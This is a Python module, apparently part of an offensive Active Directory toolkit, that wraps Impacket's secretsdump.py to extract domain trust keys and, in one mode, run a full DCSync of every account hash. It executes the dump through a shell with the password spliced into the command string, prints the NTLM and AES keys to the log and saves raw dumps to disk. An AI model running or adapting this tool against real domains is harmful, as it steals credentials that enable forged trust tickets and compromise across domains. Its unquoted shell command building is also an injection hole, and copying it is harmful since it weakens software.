"""
Secretsdump Trust Key Extractor
Extract trust keys using Impacket's secretsdump.py
"""

import subprocess
import shutil
from typing import Optional, List
from pathlib import Path
from datetime import datetime

from .base import BaseExtractor
from ..models import TrustKey, KeyType, ExtractionMethod
from ..utils import get_trust_account_name, parse_secretsdump_output


class SecretsdumpExtractor(BaseExtractor):
    """
    Extract trust keys using Impacket secretsdump.py

    Requirements:
    - Domain Admin on source domain
    - Impacket installed
    - Network access to DC
    """

    def __init__(self, output_dir: str = "trust_keys", verbose: bool = True):
        """
        Initialize secretsdump extractor
        """
        super().__init__(output_dir, verbose)
        self.timeout = 120

    def is_available(self) -> bool:
        """Check if secretsdump.py is available"""
        return shutil.which("secretsdump.py") is not None

    def generate_commands(
            self,
            source_domain: str,
            target_domain: str,
            dc_ip: Optional[str] = None
    ) -> List[str]:
        """
        Generate secretsdump commands for trust key extraction
        """
        trust_account = get_trust_account_name(target_domain)
        dc_target = dc_ip if dc_ip else source_domain

        commands = [
            "# Impacket secretsdump.py Trust Key Extraction",
            "# Requires Domain Admin privileges",
            "",
            "# Extract specific trust account",
            f"secretsdump.py {source_domain}/USERNAME:'PASSWORD'@{dc_target} -just-dc-user '{trust_account}'",
            "",
            "# Extract ALL trust accounts (accounts ending with $)",
            f"secretsdump.py {source_domain}/USERNAME:'PASSWORD'@{dc_target} | grep -E '\\$:.*:::'",
            "",
            "# Full DCSync (gets everything - larger output)",
            f"secretsdump.py {source_domain}/USERNAME:'PASSWORD'@{dc_target}",
        ]

        return commands

    def extract(
            self,
            source_domain: str,
            target_domain: str,
            username: str,
            password: str,
            dc_ip: Optional[str] = None
    ) -> List[TrustKey]:
        """
        Extract trust keys using secretsdump.py
        """
        self.log(f"Extracting trust keys using secretsdump...")
        self.log(f"Source domain: {source_domain}")
        self.log(f"Target domain: {target_domain}")

        trust_account = get_trust_account_name(target_domain)
        dc_target = dc_ip if dc_ip else source_domain

        # Build command
        cmd = f"secretsdump.py {source_domain}/{username}:'{password}'@{dc_target} -just-dc-user '{trust_account}'"

        self.log(f"Trust account: {trust_account}")
        self.log(f"Executing secretsdump...")

        keys = []

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=self.timeout
            )

            if result.returncode == 0 and result.stdout:
                self.log("secretsdump completed successfully", "success")

                # Parse output
                keys = self._parse_output(
                    result.stdout,
                    source_domain,
                    target_domain
                )

                if keys:
                    self.log(f"Extracted {len(keys)} trust key(s)", "success")
                    self.save_keys(keys, source_domain)

                    # Log key info
                    for key in keys:
                        self.log(f"  Account: {key.account_name}")
                        self.log(f"  NTLM: {key.key_value}")
                        if key.aes256_key:
                            self.log(f"  AES256: {key.aes256_key}")
                else:
                    self.log("No trust keys found in output", "warning")

                # Save raw output
                self._save_raw_output(result.stdout, source_domain, target_domain)

            else:
                self.log(f"secretsdump failed: {result.stderr}", "error")

        except subprocess.TimeoutExpired:
            self.log("secretsdump timeout", "error")
        except Exception as e:
            self.log(f"Error: {e}", "error")

        return keys

    def extract_all_trusts(
            self,
            source_domain: str,
            username: str,
            password: str,
            dc_ip: Optional[str] = None
    ) -> List[TrustKey]:
        """
        Extract ALL trust keys from a domain
        """
        self.log(f"Extracting all trust keys from {source_domain}...")

        dc_target = dc_ip if dc_ip else source_domain

        # Full DCSync, filter for trust accounts
        cmd = f"secretsdump.py {source_domain}/{username}:'{password}'@{dc_target}"

        keys = []

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300  # Longer timeout for full dump
            )

            if result.returncode == 0 and result.stdout:
                self.log("Full DCSync completed", "success")

                # Parse all trust accounts
                parsed = parse_secretsdump_output(result.stdout)

                for account, key_info in parsed.items():
                    if account.endswith("$") and key_info.get("ntlm"):
                        # Determine target domain from account name
                        target = account.rstrip("$").lower()

                        key = TrustKey(
                            account_name=account,
                            source_domain=source_domain,
                            target_domain=target,
                            key_type=KeyType.RC4_HMAC,
                            key_value=key_info["ntlm"],
                            aes256_key=key_info.get("aes256"),
                            aes128_key=key_info.get("aes128"),
                            extracted_at=datetime.now(),
                            extraction_method=ExtractionMethod.SECRETSDUMP,
                        )
                        keys.append(key)

                        self.log(f"Found trust: {source_domain} -> {target}", "success")

                if keys:
                    self.save_keys(keys, source_domain)
                else:
                    self.log("No trust accounts found", "warning")

        except subprocess.TimeoutExpired:
            self.log("secretsdump timeout (full dump)", "error")
        except Exception as e:
            self.log(f"Error: {e}", "error")

        return keys

    def _parse_output(
            self,
            output: str,
            source_domain: str,
            target_domain: str
    ) -> List[TrustKey]:
        """
        Parse secretsdump output for trust keys
        """
        keys = []
        parsed = parse_secretsdump_output(output)

        for account, key_info in parsed.items():
            if key_info.get("ntlm"):
                key = TrustKey(
                    account_name=account,
                    source_domain=source_domain,
                    target_domain=target_domain,
                    key_type=KeyType.RC4_HMAC,
                    key_value=key_info["ntlm"],
                    aes256_key=key_info.get("aes256"),
                    aes128_key=key_info.get("aes128"),
                    extracted_at=datetime.now(),
                    extraction_method=ExtractionMethod.SECRETSDUMP,
                )
                keys.append(key)

        return keys

    def _save_raw_output(
            self,
            output: str,
            source_domain: str,
            target_domain: str
    ) -> Path:
        """Save raw secretsdump output"""
        filename = f"secretsdump_raw_{source_domain}_to_{target_domain}.txt"
        filepath = self.output_dir / filename

        with open(filepath, 'w') as f:
            f.write(f"# secretsdump.py output\n")
            f.write(f"# Source: {source_domain}\n")
            f.write(f"# Target: {target_domain}\n")
            f.write(f"# Time: {datetime.now().isoformat()}\n\n")
            f.write(output)

        self.log(f"Raw output saved to: {filepath}")

        return filepath